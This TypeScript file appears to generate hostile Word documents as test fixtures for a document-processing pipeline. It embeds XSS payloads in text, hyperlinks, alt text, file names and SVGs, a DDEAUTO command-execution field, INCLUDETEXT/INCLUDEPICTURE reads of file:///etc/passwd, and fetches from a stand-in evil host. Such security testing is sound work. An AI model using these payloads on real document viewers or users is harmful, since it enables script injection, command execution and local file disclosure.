// Hostile slots in the text itself: paragraphs, links, fields, alt text, image names and SVG pictures.
import { EVIL_HOST, W, R, REL, XML, esc, run, htmlPayload, jsUrl, evilUrl } from "./hostile-payloads";
import type { Ctx } from "./hostile-docx";

/** text: paragraph text, a table cell, a header and a footer, a content control, a bookmark, a text-box-like run */
export function textSlot(c: Ctx): void {
  const { on, body, p, nextRid, t, para, addPart } = c;
  if (on.has("text")) {
    body.push(para(t(htmlPayload("text:paragraph"))));
    body.push(para(t(`"><img src=x onerror="${run("text:quote")}">`) + t(`'><svg/onload=${run("text:svg")}>`) + t(`</p><script>${run("text:close")}</script>`)));
    body.push(para(t(`&lt;script&gt;${run("text:entity")}&lt;/script&gt; &#60;img src=x onerror=${run("text:numeric")}&#62;`)));
    body.push(para(t(`[x](javascript:${run("text:markdown")}) ![y](http://${EVIL_HOST}/text/md-image) <script>${run("text:md-html")}</script> \`\`\` ## # * _ | ~~`)));
    body.push(
      `<w:tbl><w:tblPr><w:tblW w:w="5000" w:type="pct"/></w:tblPr><w:tblGrid><w:gridCol w:w="4000"/></w:tblGrid><w:tr><w:tc><w:tcPr><w:tcW w:w="4000" w:type="dxa"/></w:tcPr>${para(t(htmlPayload("text:cell")))}</w:tc></w:tr></w:tbl>`,
    );
    body.push(para(`<w:bookmarkStart w:id="90" w:name="${esc(`bm_"><img src=x onerror=${run("text:bookmark")}>`.replace(/[^A-Za-z0-9_"<>=().:'+ ]/g, "_"))}"/>${t("bookmarked")}<w:bookmarkEnd w:id="90"/>`));
    body.push(
      `<w:sdt><w:sdtPr><w:alias w:val="${esc(htmlPayload("text:control-title"))}"/><w:tag w:val="${esc(htmlPayload("text:control-tag"))}"/><w:id w:val="4242"/><w:showingPlcHdr/><w:text/></w:sdtPr><w:sdtContent>${para(t(htmlPayload("text:control")))}</w:sdtContent></w:sdt>`,
    );
    const mk = (kind: "header" | "footer") => {
      const id = nextRid();
      const name = `${kind}1.xml`;
      addPart(`word/${name}`, `${XML}<w:${kind === "header" ? "hdr" : "ftr"} xmlns:w="${W}" xmlns:r="${R}">${para(t(htmlPayload(`text:${kind}`)))}</w:${kind === "header" ? "hdr" : "ftr"}>`, `application/vnd.openxmlformats-officedocument.wordprocessingml.${kind}+xml`);
      p.rels.push(`<Relationship Id="${id}" Type="${REL}/${kind}" Target="${name}"/>`);
      return `<w:${kind}Reference w:type="default" r:id="${id}"/>`;
    };
    c.hdrRef = mk("header") + mk("footer");
  }
}

/** links: hyperlinks of every unsafe kind, a tooltip, an anchor with script in its name */
export function linksSlot(c: Ctx): void {
  const { on, body, links, p, nextRid, t, para } = c;
  if (on.has("links")) {
    const kinds: [string, string][] = [
      ["javascript", jsUrl("links:javascript")],
      ["javascript-mixed-case", `JaVaScRiPt:${run("links:mixed")}`],
      ["javascript-tab", `java\tscript:${run("links:tab")}`],
      ["javascript-space", ` javascript:${run("links:space")}`],
      ["data-html", `data:text/html,<script>${run("links:data")}</script>`],
      ["data-base64", `data:text/html;base64,${Buffer.from(`<script>${run("links:data64")}</script>`).toString("base64")}`],
      ["vbscript", `vbscript:MsgBox("links:vbscript")`],
      ["file", "file:///etc/passwd"],
      ["blob", "blob:http://evil.test/links-blob"],
      ["https", evilUrl("links", "https", "https")],
    ];
    for (const [name, href] of kinds) {
      const id = nextRid();
      p.rels.push(`<Relationship Id="${id}" Type="${REL}/hyperlink" Target="${esc(href)}" TargetMode="External"/>`);
      body.push(para(`<w:hyperlink r:id="${id}" w:tooltip="${esc(htmlPayload(`links:tooltip-${name}`))}">${t(`link ${name}`)}</w:hyperlink>`));
      links.push({ text: `link ${name}`, href });
    }
    body.push(para(`<w:hyperlink w:anchor="${esc(`javascript:${run("links:anchor")}`)}">${t("link anchor script")}</w:hyperlink>`));
    body.push(para(`<w:hyperlink w:anchor="${esc(`"><img src=x onerror=${run("links:anchor-html")}>`)}" w:history="1">${t("link anchor html")}</w:hyperlink>`));
  }
}

/** fields: HYPERLINK, INCLUDEPICTURE and INCLUDETEXT with web and file addresses, DDE, a merge field with script */
export function fieldsSlot(c: Ctx): void {
  const { on, body, links, t, para } = c;
  if (on.has("fields")) {
    const complex = (code: string, result: string) =>
      para(`<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> ${esc(code)} </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${t(result)}<w:r><w:fldChar w:fldCharType="end"/></w:r>`);
    const simple = (code: string, result: string) => para(`<w:fldSimple w:instr=" ${esc(code)} ">${t(result)}</w:fldSimple>`);
    body.push(complex(`HYPERLINK "${jsUrl("fields:hyperlink-js")}"`, "field hyperlink js"));
    body.push(complex(`HYPERLINK "data:text/html,<script>${run("fields:hyperlink-data")}</script>"`, "field hyperlink data"));
    body.push(simple(`HYPERLINK "vbscript:MsgBox(1)"`, "field hyperlink vbscript"));
    body.push(complex(`HYPERLINK \\l "javascript:${run("fields:hyperlink-l")}"`, "field hyperlink local"));
    body.push(complex(`INCLUDEPICTURE "${evilUrl("fields", "includepicture-http")}.png" \\d`, "field includepicture http"));
    body.push(complex(`INCLUDEPICTURE "file:///etc/passwd" \\d`, "field includepicture file"));
    body.push(complex(`INCLUDETEXT "${evilUrl("fields", "includetext-http")}.docx"`, "field includetext http"));
    body.push(complex(`INCLUDETEXT "file:///etc/passwd"`, "field includetext file"));
    body.push(simple(`INCLUDETEXT "\\\\${EVIL_HOST}\\share\\x.docx"`, "field includetext unc"));
    body.push(complex(`LINK Excel.Sheet.12 "${evilUrl("fields", "link")}.xlsx" "R1C1"`, "field link"));
    body.push(complex(`DDEAUTO cmd "/c ${run("fields:dde")}" "x"`, "field dde"));
    body.push(complex(`MERGEFIELD "${htmlPayload("fields:mergefield")}"`, htmlPayload("fields:mergefield-result")));
    body.push(complex(`IMPORT "${evilUrl("fields", "import")}.png"`, "field import"));
    body.push(complex(`INCLUDEPICTURE "javascript:${run("fields:includepicture-js")}"`, "field includepicture js"));
    body.push(complex(`QUOTE "${htmlPayload("fields:quote")}"`, htmlPayload("fields:quote-result")));
    links.push({ text: "field hyperlink js", href: jsUrl("fields:hyperlink-js") });
  }
}

/** alt text: picture and shape names, descriptions and titles */
export function altSlot(c: Ctx): void {
  const { on, body, para, pic, needPng } = c;
  let mediaRid = "";
  if (on.has("alt")) {
    mediaRid = needPng("alt.png");
    body.push(para(pic({ rid: mediaRid, id: c.docPrId++, name: htmlPayload("alt:name"), descr: htmlPayload("alt:descr"), title: htmlPayload("alt:title") })));
    body.push(para(pic({ rid: mediaRid, id: c.docPrId++, name: `x" onerror="${run("alt:attr")}`, descr: `" onmouseover="${run("alt:attr2")}" x="`, title: `javascript:${run("alt:title-js")}` })));
  }
}

/** images: file names that try to leave an attribute, a path or a header */
export function imagesSlot(c: Ctx): void {
  const { on, body, para, pic, needPng } = c;
  if (on.has("images")) {
    const names = [
      `x"onerror="${run("images:quote")}".png`,
      `<img src=x onerror=${run("images:tag")}>.png`,
      `..%2F..%2Fescape.png`,
      `a b'c;d.png`,
      `javascript-${run("images:js")}.png`.replace(/[()'"]/g, "_"),
    ];
    names.forEach((n, i) => {
      const id = needPng(n);
      body.push(para(pic({ rid: id, id: c.docPrId++, name: n, descr: `image file ${i}` })));
    });
  }
}

/** svg: pictures that are SVG with script, handlers, foreignObject and outside references */
export function svgSlot(c: Ctx): void {
  const { on, body, p, nextRid, para, addPart, pic, needPng } = c;
  if (on.has("svg")) {
    const evilSvg = (id: string) =>
      `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" viewBox="0 0 100 100" onload="${run(`${id}:onload`)}">` +
      `<script>${run(`${id}:script`)}</script><script xlink:href="${evilUrl(id, "script-href")}.js"/>` +
      `<style>@import url(${evilUrl(id, "css-import")}.css); rect { fill: url(${evilUrl(id, "css-fill")}#a); }</style>` +
      `<rect width="100" height="100" fill="red" onclick="${run(`${id}:onclick`)}" onmouseover="${run(`${id}:mouseover`)}"/>` +
      `<a xlink:href="javascript:${run(`${id}:a-js`)}"><text x="5" y="50">svg link</text></a>` +
      `<image href="${evilUrl(id, "image-href")}.png" width="10" height="10"/><image xlink:href="${evilUrl(id, "image-xlink")}.png" width="10" height="10"/>` +
      `<use href="${evilUrl(id, "use")}.svg#a"/><set attributeName="onmouseover" to="${run(`${id}:set`)}"/>` +
      `<foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><img src="${evilUrl(id, "fo-img")}.png" onerror="${run(`${id}:fo`)}"/><iframe src="javascript:${run(`${id}:iframe`)}"></iframe></body></foreignObject>` +
      `</svg>`;
    // 1: a PNG picture with an SVG alternative (what Word 2016 writes); 2: the SVG as the only picture
    const svgA = nextRid();
    addPart("word/media/evil-a.svg", evilSvg("svg-a"));
    p.rels.push(`<Relationship Id="${svgA}" Type="${REL}/image" Target="media/evil-a.svg"/>`);
    const pngA = needPng("fallback.png");
    body.push(para(pic({ rid: pngA, svgRid: svgA, id: c.docPrId++, descr: "svg with png fallback" })));
    const svgB = nextRid();
    addPart("word/media/evil-b.svg", evilSvg("svg-b"));
    p.rels.push(`<Relationship Id="${svgB}" Type="${REL}/image" Target="media/evil-b.svg"/>`);
    body.push(para(pic({ rid: svgB, id: c.docPrId++, descr: "svg only" })));
    // an SVG named .png, and a PNG named .svg
    const svgC = nextRid();
    addPart("word/media/svg-as.png", evilSvg("svg-c"));
    p.rels.push(`<Relationship Id="${svgC}" Type="${REL}/image" Target="media/svg-as.png"/>`);
    body.push(para(pic({ rid: svgC, id: c.docPrId++, descr: "svg named png" })));
    // an SVG with a text/html payload
    const html = nextRid();
    addPart("word/media/html-as.svg", `<html><script>${run("svg:html")}</script></html>`);
    p.rels.push(`<Relationship Id="${html}" Type="${REL}/image" Target="media/html-as.svg"/>`);
    body.push(para(pic({ rid: html, id: c.docPrId++, descr: "html named svg" })));
  }
}
